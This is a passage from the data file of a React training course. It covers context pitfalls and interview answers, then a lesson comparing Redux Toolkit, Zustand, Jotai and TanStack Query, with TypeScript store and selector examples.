        ["mid", "A provider passes value={{ user, logout }}. What's the problem and the fix?", `<p>The object literal is a new object every time the provider component renders, so <code>Object.is</code> sees a change and every consumer re-renders, even when <code>user</code> didn't change (for example, the provider re-rendered because its own parent did). Fix: <code>useMemo(() =&gt; ({ user, logout }), [user, logout])</code> and make <code>logout</code> stable with <code>useCallback</code>. If the provider only re-renders when <code>user</code> changes anyway, the memo has little effect, which is why it's a "check the parent" problem, not a blanket rule.</p>`],
        ["mid", "How do you type a context in TypeScript so consumers don't need non-null assertions?", `<p>Create it as <code>createContext&lt;Value | null&gt;(null)</code>, and export a custom hook that reads it, throws a descriptive error if it's <code>null</code>, and returns <code>Value</code>. The return type is narrowed, so consumers get a non-null value, and a missing provider fails immediately in development. The tempting alternative, <code>createContext&lt;Value&gt;({} as Value)</code>, lies to the compiler and turns a missing provider into runtime <code>undefined is not a function</code> errors far from the cause.</p>`],
        ["mid", "Why split state and dispatch into two contexts when using useReducer?", `<p><code>dispatch</code> from <code>useReducer</code> is stable for the component's lifetime, while <code>state</code> changes on every action. If both live in one context value, components that only dispatch (buttons, forms) re-render on every state change. With two contexts, dispatch-only consumers depend on a value that never changes, so they never re-render due to state updates; only state readers do.</p>`],
        ["senior", "Is context a state management solution? Compare it with Redux or Zustand.", `<p>Context is a <b>dependency-injection / transport mechanism</b>: it moves a value down the tree. The state itself lives in <code>useState</code>/<code>useReducer</code> in the provider. Compared with external stores: context has no selectors (all consumers re-render on any change), no middleware, no devtools time-travel, and its state is tied to a component's lifetime. Redux and Zustand keep state outside React and let components subscribe to slices via <code>useSyncExternalStore</code>, so only components whose selected value changed re-render. Context + <code>useReducer</code> is great for low-frequency or feature-scoped state; a store fits large, frequently updated shared client state. Note that React Redux itself uses context, but only to pass the <i>store</i> (which never changes), not the state.</p>`],
        ["senior", "What does React 19's use(Context) change compared with useContext?", `<p>It reads the same nearest provider value, but <code>use</code> can be called conditionally and in loops (within components/hooks), whereas <code>useContext</code> must follow the rules of hooks. That means a component can avoid subscribing to a context on render paths where it doesn't need it. It does not add selectors or change re-render semantics when you do read it. It's React 19-only, and <code>.Provider</code> vs <code>&lt;Context value&gt;</code> is a separate React 19 change (the short provider form).</p>`],
        ["lead", "Your dashboard re-renders 300 components on every websocket price tick. The prices are in a context. How do you fix it?", `<p>Confirm with the Profiler first. Then: move the ticking data out of context into an external store (Zustand, Redux, or a small <code>useSyncExternalStore</code> store) and have each cell subscribe with a selector for its own symbol, so a tick re-renders only the affected cells. Keep context only for stable things (the store instance or a client). If the tick rate is higher than the eye can follow, also throttle/batch updates (e.g. apply at most every 250 ms) and consider <code>useDeferredValue</code> for expensive derived views. Splitting the context into many smaller contexts helps less, because a single price context still notifies every reader.</p>`],
        ["architect", "How would you decide what goes into context across a large app with several teams?", `<p>Set a policy: context is for <b>stable, cross-cutting dependencies</b> (theme, i18n, auth session, feature flags, service clients) and for <b>compound-component internals</b>. Server data goes through the query layer, shareable view state through the URL, high-frequency or large shared client state through one sanctioned store library. Each context lives in its feature module with a typed hook that throws outside its provider, providers are mounted at the narrowest route that needs them, and no "global AppContext" is allowed. Review new contexts for change frequency and consumer count. The goal is predictable re-render cost and clear ownership, not avoiding context.</p>`]
      ],
      gotchas: [
        `<b>Provider in the same component doesn't count.</b> If <code>App</code> renders <code>&lt;ThemeContext value="dark"&gt;</code> and also calls <code>useContext(ThemeContext)</code> itself, it gets the value from <i>above</i> <code>App</code> (or the default). Move the reading into a child component.`,
        `<b>Creating the context inside a component</b> (<code>const Ctx = createContext()</code> in a render) creates a new context every render; consumers never match the provider. Always create at module scope.`,
        `<b>Passing <code>undefined</code> to a provider</b> gives consumers <code>undefined</code>, not the default value. <code>value={user ?? undefined}</code> while loading will not "fall back" to anything.`,
        `<b>Forgetting the provider</b> silently returns the default value, which can look like "my state never updates". The throwing custom hook turns this into a clear error.`,
        `<b>Duplicate module instances.</b> Two copies of the context module (two React versions, a linked package with its own <code>node_modules</code>, or importing <code>./context</code> and <code>./Context</code> on a case-insensitive file system) create two contexts that never see each other's providers.`,
        `<b>Functions inside the value</b> need <code>useCallback</code> too; memoising the object but recreating <code>logout</code> each render still produces a new value via the dependency array.`,
        `<b>Context updates aren't free for intermediate components when the provider re-renders its own children.</b> If the provider component builds its children inline (instead of receiving <code>children</code> from a parent), those children re-render whenever the provider's state changes, consumers or not.`,
        `<b>Vite's Fast Refresh lint rule</b> warns when one file exports a context/hook and a component together. Split into <code>auth-context.ts</code> and <code>AuthProvider.tsx</code>.`
      ],
      best: [
        `One context per concern, created once at module level, with a provider component and a typed <code>useX()</code> hook that throws outside the provider.`,
        `Memoise provider values (<code>useMemo</code> for objects, <code>useCallback</code> for functions), or confirm the React Compiler is doing it, and verify with the Profiler.`,
        `Split by change frequency, and split <code>state</code> from <code>dispatch</code> when using <code>useReducer</code>.`,
        `Mount providers as low in the tree as possible; feature providers belong in the feature's route layout.`,
        `Try composition (<code>children</code>, slot props) before context for layout-level drilling.`,
        `Don't use context as a server cache or for high-frequency data; use TanStack Query (Day 7) or an external store with selectors.`,
        `Model async-loaded context values as a discriminated union (<code>loading | anonymous | authenticated</code>) so consumers must handle every state.`
      ],
      lab: [
        `In your Vite react-ts app, create <code>src/theme/theme-context.ts</code> and <code>src/theme/ThemeProvider.tsx</code> exactly as in example 2. Wrap <code>&lt;App /&gt;</code> in <code>main.tsx</code> and add a <code>ThemeToggle</code>. Add CSS for <code>[data-theme="dark"] body { background: #111; color: #eee; }</code>.`,
        `Temporarily render <code>&lt;ThemeToggle /&gt;</code> outside the provider and confirm the error message. Put it back.`,
        `Build the <code>AuthProvider</code> from example 3. If your FastAPI backend isn't running, add a Vite proxy (<code>server.proxy: { "/api": "http://localhost:8000" }</code>) or temporarily replace <code>fetchMe</code> with a function that resolves a fake user after 500 ms. Render <code>UserMenu</code> and see the loading, signed-in and signed-out states.`,
        `Recreate example 4 (<code>Shop</code> and <code>Price</code>). Open React DevTools → Profiler, enable "Highlight updates when components render", click "Open cart" with the inline-object version, then with the <code>useMemo</code> version, and compare.`,
        `Build the cart from example 5 with ten <code>AddToCartButton</code>s and one <code>CartBadge</code>. Add a <code>console.log</code> in each. Then merge state and dispatch into one context and observe the difference.`,
        `<b>Done when:</b> the theme persists across reloads, <code>useTheme()</code>/<code>useAuth()</code> throw outside their providers, the Profiler shows no <code>Price</code> renders when toggling the cart with the memoised value, and adding an item re-renders only <code>CartBadge</code> (not the buttons) with split contexts.`
      ],
      teach: `<p>"Context is React's way of passing a value to a whole subtree without threading it through every component. You create a context once, a provider puts a value into the tree, and any descendant reads the nearest one with <code>useContext</code>. The default value is only used when there's no provider at all."</p>
<p>"The catch is re-renders. When the provider's value changes, compared by identity, every component that reads that context re-renders, even if it's wrapped in <code>memo</code> and even if it only uses one field. So if you write <code>value={{ user, logout }}</code>, that's a new object every render and everything re-renders. Memoise the value, split contexts by how often they change, and with <code>useReducer</code> put state and dispatch in separate contexts, because dispatch never changes."</p>
<p>"In TypeScript I create the context with a null default and expose a custom hook that throws outside the provider, so I get proper types and a clear error. And I use context for stable, app-wide things like theme, auth and locale, not for server data, which belongs in TanStack Query, and not for fast-changing data that many components read, which needs a store with selectors."</p>`
    },

    /* ------------------------------------------------------------------ */
    {
      id: "d6-state-libs",
      title: "State management: client vs server state, Redux Toolkit, Zustand",
      lv: ["mid", "senior", "lead", "architect"],
      eli5: `<p>Think of a restaurant. Each waiter keeps a notepad for their own table (what the guests are still deciding): that's <b>local state</b>. The kitchen has a whiteboard everyone can see: which tables are waiting, which dishes are sold out today. That's <b>global client state</b>: shared, but it only exists while the restaurant is open.</p>
<p>Then there's the <b>supplier's warehouse</b>: the true stock of ingredients. The kitchen keeps a copy of "how many tomatoes we have", but the real number lives elsewhere and can change without the kitchen doing anything. Keeping that copy fresh (asking again, noticing it's old) is a different job entirely. That's <b>server state</b>, and it needs a specialist (TanStack Query).</p>
<p>Finally the <b>order ticket</b> clipped to the table: "table 7, mains, no onions". Anyone can read it, it survives a waiter changing shift, and you can hand it to someone else. That's <b>URL state</b>.</p>
<p>State management libraries are just different designs for the kitchen whiteboard. Redux is a strict whiteboard with a logbook of every change. Zustand is a simple whiteboard anyone can update with a marker. The key skill is not picking a favourite; it's noticing that most of what people put on the whiteboard actually belonged in the warehouse or on the order ticket.</p>`,
      what: `<h5>The four kinds of state</h5>
<p>Before choosing a library, classify each piece of state. Different kinds have different owners, lifetimes and failure modes:</p>
<table class="tbl">
<tr><th>Kind</th><th>Examples</th><th>Who owns the truth</th><th>Right tool</th></tr>
<tr><td><b>Local UI</b></td><td>input text, dropdown open, hovered row, wizard step</td><td>one component</td><td><code>useState</code> / <code>useReducer</code>, lifted only as far as needed</td></tr>
<tr><td><b>Global client</b></td><td>theme, sidebar collapsed, cart before checkout, editor selection, unsaved drafts</td><td>the browser session</td><td>context (low frequency) or a store: Zustand, Redux Toolkit, Jotai</td></tr>
<tr><td><b>Server / cache</b></td><td>products, orders, the current user's profile, dashboard metrics</td><td>FastAPI + PostgreSQL; the client holds a <i>possibly stale copy</i></td><td>TanStack Query (Day 7) or RTK Query</td></tr>
<tr><td><b>URL</b></td><td>search query, filters, sort, page, selected tab, open item id</td><td>the address bar</td><td>router params and search params (Day 8)</td></tr>
</table>
<p>Two more categories show up in reviews: <b>form state</b> (React Hook Form, Day 9, which is local state with validation) and <b>derived state</b> (totals, filtered lists), which should be computed during render or in a selector, never stored separately (Day 4).</p>
<h5>Why server state is different (and belongs in TanStack Query)</h5>
<p>Server state is a <b>cache of data you don't own</b>. It can go stale while you look at it, other users change it, and you need: loading and error states, deduplicating identical requests, caching by key, background refetching, invalidation after mutations, retries, pagination, and garbage collection of unused data. Putting it in Redux or Zustand means writing all of that by hand (the classic <code>FETCH_PRODUCTS_REQUEST / SUCCESS / FAILURE</code> trio per endpoint). TanStack Query (Day 7) or RTK Query does it with a cache keyed by query, so your <i>client</i> store shrinks to the genuinely client-side parts, often to almost nothing.</p>
<h5>Redux Toolkit (RTK)</h5>
<p>Redux is a single external store holding one state tree, updated only by <b>dispatching actions</b> to pure <b>reducers</b>. Redux Toolkit is the official, recommended way to write Redux today; hand-written <code>createStore</code>, action-type constants and switch reducers are legacy.</p>
<ul class="pts">
<li><b><code>configureStore({ reducer })</code></b> creates the store, combines slice reducers, and adds sensible middleware by default: thunks for async logic, and in development, checks that warn about mutations and non-serialisable values. It also enables Redux DevTools.</li>
<li><b><code>createSlice({ name, initialState, reducers })</code></b> generates action creators and a reducer from "case reducer" functions. Inside them you may write <b>mutating</b> code (<code>state.items.push(x)</code>) because RTK uses <b>Immer</b>, which records the mutations on a draft and produces a new immutable state.</li>
<li><b>Typed hooks:</b> derive <code>RootState</code> from <code>store.getState</code> and <code>AppDispatch</code> from <code>store.dispatch</code>, then create <code>useAppSelector</code>/<code>useAppDispatch</code> once (React Redux 9.1+ has <code>useSelector.withTypes&lt;RootState&gt;()</code>; older code uses <code>TypedUseSelectorHook</code>).</li>
<li><b>Selectors:</b> <code>useSelector(selector)</code> runs the selector after every dispatched action and re-renders the component only if the result changed by reference (<code>===</code>). Select the smallest value you need. For derived data that returns new arrays/objects, memoise with <code>createSelector</code> (Reselect, re-exported by RTK) so the result keeps its identity when inputs didn't change.</li>
<li><b>RTK Query</b> (<code>createApi</code>, <code>fetchBaseQuery</code>) is RTK's built-in server-state cache, comparable in purpose to TanStack Query. If a team is already on Redux, it's the natural choice for server data; otherwise TanStack Query is more common.</li>
<li>Strengths: one predictable data flow, excellent DevTools (action log, time travel), middleware, patterns that scale across large teams. Costs: more ceremony than Zustand and a <code>Provider</code> at the root.</li>
</ul>
<h5>Zustand</h5>
<p>Zustand is a small store library built around a hook. <code>create()</code> returns a hook bound to a store that lives outside React; the store holds state and the actions that change it.</p>
<ul class="pts">
<li><b>No provider needed</b> (the store is a module-level singleton). For per-request stores in SSR or per-instance stores, you can create a store in context; that's an advanced pattern.</li>
<li><b>Selectors decide re-renders.</b> <code>useCartStore((s) =&gt; s.items.length)</code> re-renders only when that number changes. Calling <code>useCartStore()</code> with no selector subscribes to the whole store: every change re-renders the component.</li>
<li><b>Selectors returning new objects</b> (<code>(s) =&gt; ({ a: s.a, b: s.b })</code>) produce a new object every time, so the default <code>Object.is</code> comparison always fails. Wrap the selector in <code>useShallow</code> (shallow-compares the object's keys), or select fields separately. In Zustand v5, an unstable selector like this can cause an infinite render loop ("Maximum update depth exceeded"), not just extra renders.</li>
<li><code>set</code> merges at the top level (shallowly) by default; nested updates are immutable spreads, or add the <code>immer</code> middleware. <code>useStore.getState()</code> and <code>.setState()</code> work outside React (in a fetch wrapper, a websocket handler, tests).</li>
<li>Middleware: <code>persist</code> (localStorage), <code>devtools</code> (Redux DevTools integration), <code>immer</code>, <code>subscribeWithSelector</code>.</li>
</ul>
<h5>Jotai (briefly)</h5>
<p>Jotai models state as many small <b>atoms</b> instead of one store. <code>atom(initial)</code> declares a piece of state; <code>atom((get) =&gt; …)</code> declares a <b>derived</b> atom that recomputes when its dependencies change. Components use <code>useAtom</code>, <code>useAtomValue</code> or <code>useSetAtom</code>, and only components using an atom that changed re-render. It feels like <code>useState</code> that can be shared, and suits apps with many independent pieces of interrelated state (editors, design tools). Recoil had a similar model but is no longer actively maintained; don't start new work on it.</p>
<h5><code>useSyncExternalStore</code>: the primitive underneath</h5>
<p>React 18 added <code>useSyncExternalStore(subscribe, getSnapshot, getServerSnapshot?)</code> so libraries can read a store that lives outside React safely under concurrent rendering. <code>subscribe(callback)</code> registers a listener and returns an unsubscribe function; <code>getSnapshot()</code> returns the current value and must return the <b>same reference</b> when nothing changed. React Redux's <code>useSelector</code> and Zustand's hooks are built on it (directly or via its shim). Knowing it lets you write a tiny store yourself, and explains every selector rule above. Day 10 uses it for custom hooks such as <code>useOnlineStatus</code>.</p>
<h5>Comparison</h5>
<table class="tbl">
<tr><th></th><th>Context + useReducer</th><th>Redux Toolkit</th><th>Zustand</th><th>Jotai</th><th>TanStack Query</th></tr>
<tr><td>Kind of state</td><td>client, low-frequency</td><td>client (+ server via RTK Query)</td><td>client</td><td>client</td><td><b>server</b></td></tr>
<tr><td>Re-render granularity</td><td>all consumers</td><td>per selector</td><td>per selector</td><td>per atom</td><td>per query + tracked fields</td></tr>
<tr><td>Boilerplate</td><td>low-medium</td><td>medium</td><td>low</td><td>low</td><td>low</td></tr>
<tr><td>Provider</td><td>yes</td><td>yes (<code>&lt;Provider store&gt;</code>)</td><td>no</td><td>optional</td><td>yes (<code>QueryClientProvider</code>)</td></tr>
<tr><td>DevTools</td><td>React DevTools only</td><td>excellent (action log, time travel)</td><td>via <code>devtools</code> middleware</td><td>add-on tools</td><td>dedicated devtools</td></tr>
<tr><td>Use outside React</td><td>no</td><td>yes (<code>store.dispatch</code>)</td><td>yes (<code>getState</code>)</td><td>via a store object</td><td>yes (<code>queryClient</code>)</td></tr>
<tr><td>Best when</td><td>feature-scoped, few updates</td><td>large team, complex client logic, audit trail</td><td>most apps' small global client state</td><td>many fine-grained interdependent values</td><td>any data from <code>/api</code></td></tr>
</table>
<h5>Choosing for a team</h5>
<ul class="pts">
<li>Start with <b>TanStack Query for server data</b> + <b>URL for shareable view state</b> + <b>local state</b>. Then see what genuinely global client state remains. Often it's a theme, a sidebar flag and a cart, which context or a small Zustand store handles.</li>
<li>Pick <b>Redux Toolkit</b> when there's substantial client-side domain logic (complex editors, offline-first flows, undo/redo), many developers who benefit from a strict, uniform pattern, or an existing Redux codebase. Use RTK Query for its server data rather than thunks + slices.</li>
<li>Pick <b>Zustand</b> for small-to-medium shared client state with minimal ceremony. Pick <b>Jotai</b> when state is naturally a graph of many small derived values.</li>
<li>Standardise on <b>one</b> client-store library per app. Two is a smell; three is an incident waiting to happen.</li>
</ul>
<h5>Migrating legacy Redux</h5>
<p>Old Redux (hand-written action types, <code>switch</code> reducers, <code>connect()</code>, <code>redux-thunk</code> fetching into slices, maybe <code>redux-saga</code>) can be modernised incrementally, because RTK is still Redux:</p>
<ul class="pts">
<li>Replace <code>createStore</code> + <code>applyMiddleware</code> with <code>configureStore</code>, passing the <b>existing</b> reducers unchanged. Fix any mutation or serialisability warnings it surfaces; they're real bugs.</li>
<li>Convert reducers one at a time to <code>createSlice</code>, keeping action type strings compatible if other code still dispatches them.</li>
<li>Replace <code>connect(mapState, mapDispatch)</code> with <code>useAppSelector</code>/<code>useAppDispatch</code> as you touch components.</li>
<li>Move server data out: every "fetch → store in slice → loading flag" flow becomes an RTK Query endpoint or a TanStack Query hook, and the slice is deleted. This typically removes the majority of the Redux code.</li>
<li>Re-evaluate at the end: if the remaining client state is tiny, Redux can stay (it's fine) or be replaced; don't migrate libraries just for fashion.</li>
</ul>`,
      why: `<p>As React apps grew, teams hit two problems at once: state needed by many distant components, and data fetched from the server that had to stay consistent across screens. In the mid-2010s, Flux and then <b>Redux</b> answered both with one design: a single store outside React, changes only via actions, pure reducers, and connected components. It brought predictability and great tooling, but also a lot of boilerplate, and teams put <i>everything</i> into it, especially server data, which led to sprawling slices full of <code>isLoading</code> flags and hand-written cache invalidation.</p>
<p>The ecosystem then split the problem. <b>Server-state libraries</b> (React Query, now TanStack Query; SWR; Apollo for GraphQL; RTK Query) recognised that fetched data is a <i>cache</i> with its own concerns and handled them generically. Once server data moved out, the remaining client state was small, and lighter tools like <b>Zustand</b> and <b>Jotai</b> became popular, while Redux itself got <b>Redux Toolkit</b> to cut the boilerplate. React added <code>useSyncExternalStore</code> so all these external stores could work correctly with concurrent rendering, avoiding "tearing" (different components showing different versions of the same store during one render).</p>
<p>So the modern question isn't "which state library?" but "what kind of state is this?" Interviewers at senior level look for exactly that classification, plus a clear understanding of how selectors control re-renders.</p>`,
      diagram: {
        html: lanes([
          ["Local UI", ["useState / useReducer", "input text, open/closed, hover", "dies with the component"]],
          ["Global client", ["context (rare changes)", "Zustand / Redux Toolkit / Jotai", "theme, cart, editor selection"]],
          ["Server cache", ["TanStack Query / RTK Query", "products, orders, /api/me", "stale, refetch, invalidate"]],
          ["URL", ["useSearchParams / route params", "filters, page, tab, item id", "shareable, survives reload"]]
        ]) + flow([
          ["Store", "lives outside React", "w"],
          ["subscribe()", "useSyncExternalStore registers a listener", ""],
          ["action / set()", "state replaced immutably", ""],
          ["selector(state)", "compare with previous by Object.is", "g"],
          ["re-render", "only if the selected value changed", "g"]
        ]),
        steps: [
          `Classify first: each piece of state goes in one lane. Most bugs and most unnecessary code come from putting server or URL state in the client-store lane.`,
          `An external store (Redux, Zustand) keeps state outside React. Each component that uses it subscribes via <code>useSyncExternalStore</code>, passing a function that computes its <b>selected</b> value from the store's state.`,
          `An action (<code>dispatch</code>) or <code>set()</code> replaces the state with a new immutable object and notifies all listeners.`,
          `For each subscribed component, the selector runs against the new state and the result is compared with the previous result (<code>Object.is</code> by default, or a shallow/custom comparison).`,
          `Only components whose selected value changed re-render. A selector that returns a fresh object or array every time always "changes", which is why <code>useShallow</code> and <code>createSelector</code> exist.`
        ]
      },
      ex: [
        {
          t: "Classifying state in one realistic screen",
          lang: "tsx",
          code: `// src/features/products/ProductsPage.tsx
// npm install @tanstack/react-query react-router zustand   (Day 7 and Day 8 cover the first two)
import { useState } from "react";
import { useSearchParams } from "react-router";
import { useQuery } from "@tanstack/react-query";
import { useCartStore } from "../cart/cart-store";

type Product = { id: number; name: string; price: number };

export function ProductsPage() {
  // URL state: shareable, survives reload, back button works
  const [params, setParams] = useSearchParams();
  const q = params.get("q") ?? "";
  const page = Number(params.get("page") ?? "1");

  // Server state: a cached copy of FastAPI data, keyed by the inputs
  const products = useQuery({
    queryKey: ["products", { q, page }],
    queryFn: async (): Promise<Product[]> => {
      const res = await fetch("/api/products?q=" + encodeURIComponent(q) + "&page=" + page);
      if (!res.ok) throw new Error("Failed to load products");
      return res.json();
    },
  });

  // Global client state: the cart, shared with the header badge and checkout
  const addItem = useCartStore((s) => s.addItem);

  // Local UI state: only this component cares
  const [compact, setCompact] = useState(false);

  if (products.isPending) return <p>Loading…</p>;
  if (products.isError) return <p role="alert">{products.error.message}</p>;

  return (
    <section>
      <input
        value={q}
        onChange={(e) => setParams({ q: e.target.value, page: "1" })}
        placeholder="Search"
      />
      <label>
        <input type="checkbox" checked={compact} onChange={(e) => setCompact(e.target.checked)} /> Compact
      </label>
      <ul className={compact ? "list compact" : "list"}>
        {products.data.map((p) => (
          <li key={p.id}>
            {p.name}: {p.price}
            <button onClick={() => addItem({ productId: p.id, name: p.name, price: p.price })}>Add</button>
          </li>
        ))}
      </ul>
      <button disabled={page <= 1} onClick={() => setParams({ q, page: String(page - 1) })}>Prev</button>
      <button onClick={() => setParams({ q, page: String(page + 1) })}>Next</button>
    </section>
  );
}`,
          note: `<p>Notice what is <b>not</b> here: no <code>products</code> in a global store, no <code>isLoading</code> in Redux, no filter state in context. Each kind of state has its natural home. (A real search box would debounce the URL update; Day 10's <code>useDebounce</code> does that.) The cart store is defined in the next examples.</p>`
        },
        {
          t: "Building a tiny store on useSyncExternalStore (what the libraries do)",
          lang: "ts",
          code: `// src/lib/create-store.ts
import { useSyncExternalStore } from "react";

type Listener = () => void;

export interface Store<T> {
  getState: () => T;
  setState: (updater: (prev: T) => T) => void;
  subscribe: (listener: Listener) => () => void;
}

export function createStore<T>(initial: T): Store<T> {
  let state = initial;
  const listeners = new Set<Listener>();
  return {
    getState: () => state,
    setState: (updater) => {
      const next = updater(state);
      if (Object.is(next, state)) return;      // no change, no notification
      state = next;
      listeners.forEach((l) => l());
    },
    subscribe: (listener) => {
      listeners.add(listener);
      return () => { listeners.delete(listener); };
    },
  };
}

// Subscribe with a selector. getSnapshot must return a stable value when nothing changed:
// a selector returning a new object each call would make React think the store changed
// on every check and loop ("The result of getSnapshot should be cached").
export function useStore<T, S>(store: Store<T>, selector: (state: T) => S): S {
  return useSyncExternalStore(
    store.subscribe,
    () => selector(store.getState()),
    () => selector(store.getState()) // server snapshot, used during SSR/hydration
  );
}

// usage
export const counterStore = createStore({ count: 0, step: 1 });

export function useCount() {
  return useStore(counterStore, (s) => s.count);   // primitive: stable
}
export function increment() {
  counterStore.setState((s) => ({ ...s, count: s.count + s.step }));
}`,
          out: `Components using useCount() re-render on increment(); a component selecting s.step does not.`,
          note: `<p>This ~30-line store has the same core shape as Zustand: state outside React, a listener set, immutable updates, and selector-based subscriptions through <code>useSyncExternalStore</code>. Real libraries add equality functions, middleware and devtools. <code>subscribe</code> is a stable module-level function here; if you create it inline in a component, React resubscribes every render.</p>`
        },
        {
          t: "Zustand: a typed cart store with actions, selectors and persistence",
          lang: "ts",
          code: `// npm install zustand
// src/features/cart/cart-store.ts
import { create } from "zustand";
import { persist } from "zustand/middleware";

export type CartItem = { productId: number; name: string; price: number; qty: number };

type CartState = {
  items: CartItem[];
  addItem: (item: Omit<CartItem, "qty">) => void;
  setQty: (productId: number, qty: number) => void;
  remove: (productId: number) => void;
  clear: () => void;
};

export const useCartStore = create<CartState>()(   // note the extra () for TypeScript
  persist(
    (set) => ({
      items: [],
      addItem: (item) =>
        set((s) => {
          const existing = s.items.find((i) => i.productId === item.productId);
          return {
            items: existing
              ? s.items.map((i) => (i.productId === item.productId ? { ...i, qty: i.qty + 1 } : i))
              : [...s.items, { ...item, qty: 1 }],
          };
        }),
      setQty: (productId, qty) =>
        set((s) => ({
          items: s.items.map((i) => (i.productId === productId ? { ...i, qty: Math.max(1, qty) } : i)),
        })),
      remove: (productId) => set((s) => ({ items: s.items.filter((i) => i.productId !== productId) })),
      clear: () => set({ items: [] }),       // set merges top-level keys; actions are kept
    }),
    {
      name: "cart",                                              // localStorage key
      partialize: (s) => ({ items: s.items }),                   // persist data, not functions
    }
  )
);

// Selectors as named functions: reusable and stable (defined once at module scope)
export const selectCount = (s: CartState) => s.items.reduce((n, i) => n + i.qty, 0);
export const selectTotal = (s: CartState) => s.items.reduce((sum, i) => sum + i.price * i.qty, 0);`,
          note: `<p>The curried <code>create&lt;CartState&gt;()(…)</code> form is what Zustand's docs recommend for TypeScript, especially with middleware. <code>selectCount</code> returns a number, so components using it re-render only when the count changes. Actions live in the store and never change identity, so selecting an action never causes re-renders.</p>`
        },
        {
          t: "Zustand: re-render control with selectors and useShallow",
          lang: "tsx",
          code: `import { useShallow } from "zustand/react/shallow";
import { selectCount, selectTotal, useCartStore } from "./cart-store";

// GOOD: one primitive per selector
export function CartBadge() {
  const count = useCartStore(selectCount);
  return <span className="badge">{count}</span>;
}

// BAD: no selector -> subscribes to the whole store, re-renders on every change
export function CartBadgeBad() {
  const { items } = useCartStore();
  return <span className="badge">{items.length}</span>;
}

// BAD in Zustand v5: a new object every call -> "Maximum update depth exceeded"
// (in v4 it "only" re-rendered on every store change)
// const { total, clear } = useCartStore((s) => ({ total: selectTotal(s), clear: s.clear }));

// GOOD: useShallow compares the returned object's keys one level deep
export function CartSummary() {
  const { total, clear } = useCartStore(
    useShallow((s) => ({ total: selectTotal(s), clear: s.clear }))
  );
  return (
    <div>
      <p>Total: {total.toFixed(2)}</p>
      <button onClick={clear}>Empty cart</button>
    </div>
  );
}

// Outside React: a websocket handler or fetch wrapper can read/update the store directly
export function onCheckoutCompleted() {
  useCartStore.getState().clear();
}`,
          out: `Adding an item: CartBadge re-renders (count changed), CartSummary re-renders (total changed).
Changing nothing that affects count/total (e.g. a no-op setQty to the same qty): neither re-renders.`,
          note: `<p><code>useShallow</code> is available from <code>zustand/react/shallow</code> in Zustand 4.5+ and v5. A selector like <code>(s) =&gt; s.items.filter(...)</code> also returns a new array each time; either select <code>s.items</code> and derive in the component (with <code>useMemo</code> if expensive) or wrap it in <code>useShallow</code>.</p>`
        },
        {
          t: "Redux Toolkit: slice, store, typed hooks and memoised selectors",
          lang: "tsx",
          code: `// npm install @reduxjs/toolkit react-redux
// src/features/cart/cartSlice.ts
import { createSelector, createSlice, type PayloadAction } from "@reduxjs/toolkit";

export type CartItem = { productId: number; name: string; price: number; qty: number };
type CartState = { items: CartItem[]; couponCode: string | null };

const initialState: CartState = { items: [], couponCode: null };

const cartSlice = createSlice({
  name: "cart",
  initialState,
  reducers: {
    itemAdded(state, action: PayloadAction<Omit<CartItem, "qty">>) {
      const existing = state.items.find((i) => i.productId === action.payload.productId);
      if (existing) existing.qty += 1;                 // "mutation" is safe: Immer draft
      else state.items.push({ ...action.payload, qty: 1 });
    },
    itemRemoved(state, action: PayloadAction<number>) {
      state.items = state.items.filter((i) => i.productId !== action.payload);
    },
    couponApplied(state, action: PayloadAction<string>) {
      state.couponCode = action.payload;
    },
    cleared() {
      return initialState;                             // or return a brand-new state
    },
  },
});

export const { itemAdded, itemRemoved, couponApplied, cleared } = cartSlice.actions;
export default cartSlice.reducer;

// Selectors (RootState is defined in store.ts; a type-only import avoids a runtime cycle)
import type { RootState } from "../../app/store";
export const selectCartItems = (s: RootState) => s.cart.items;
export const selectCartCount = (s: RootState) => s.cart.items.reduce((n, i) => n + i.qty, 0);
export const selectExpensiveItems = createSelector(
  [selectCartItems],
  (items) => items.filter((i) => i.price > 100)       // new array only when items change
);

// src/app/store.ts
import { configureStore } from "@reduxjs/toolkit";
import cartReducer from "../features/cart/cartSlice";

export const store = configureStore({
  reducer: { cart: cartReducer },
});
export type RootState = ReturnType<typeof store.getState>;
export type AppDispatch = typeof store.dispatch;

// src/app/hooks.ts  (React Redux 9.1+)
import { useDispatch, useSelector } from "react-redux";
import type { AppDispatch, RootState } from "./store";
export const useAppDispatch = useDispatch.withTypes<AppDispatch>();
export const useAppSelector = useSelector.withTypes<RootState>();

// src/main.tsx
import { Provider } from "react-redux";
// <Provider store={store}><App /></Provider>

// src/features/cart/CartBadge.tsx
import { useAppDispatch, useAppSelector } from "../../app/hooks";
import { cleared, selectCartCount } from "./cartSlice";

export function CartBadge() {
  const count = useAppSelector(selectCartCount);   // re-renders only when the number changes
  const dispatch = useAppDispatch();
  return (
    <button onClick={() => dispatch(cleared())} aria-label={"Cart: " + count + " items. Click to empty."}>
      {count}
    </button>
  );
}`,
          out: `Redux DevTools log after clicking "Add" twice and the badge once:
  cart/itemAdded  { productId: 7, name: "Mug", price: 12 }
  cart/itemAdded  { productId: 7, name: "Mug", price: 12 }
  cart/cleared`,
          note: `<p>The code above is several files shown together. Action types are generated as <code>"sliceName/reducerName"</code>. In development, <code>configureStore</code>'s default middleware warns if you mutate state outside a reducer or put non-serialisable values (Dates, class instances, functions) in state or actions. Older projects define typed hooks with <code>TypedUseSelectorHook&lt;RootState&gt;</code>; the result is the same.</p>`
        },
        {
          t: "RTK Query: server state inside a Redux app",
          lang: "ts",
          code: `// src/app/api.ts
import { createApi, fetchBaseQuery } from "@reduxjs/toolkit/query/react";

export type Product = { id: number; name: string; price: number };

export const api = createApi({
  reducerPath: "api",
  baseQuery: fetchBaseQuery({ baseUrl: "/api", credentials: "include" }),
  tagTypes: ["Product"],
  endpoints: (build) => ({
    getProducts: build.query<Product[], void>({
      query: () => "products",
      providesTags: ["Product"],
    }),
    updateProduct: build.mutation<Product, Pick<Product, "id"> & Partial<Product>>({
      query: ({ id, ...patch }) => ({ url: "products/" + id, method: "PATCH", body: patch }),
      invalidatesTags: ["Product"],                 // refetches getProducts after success
    }),
  }),
});

export const { useGetProductsQuery, useUpdateProductMutation } = api;

// src/app/store.ts: add the API reducer and middleware
// export const store = configureStore({
//   reducer: { cart: cartReducer, [api.reducerPath]: api.reducer },
//   middleware: (getDefault) => getDefault().concat(api.middleware),
// });

// In a component:
// const { data, isLoading, error } = useGetProductsQuery();
// const [updateProduct, { isLoading: saving }] = useUpdateProductMutation();`,
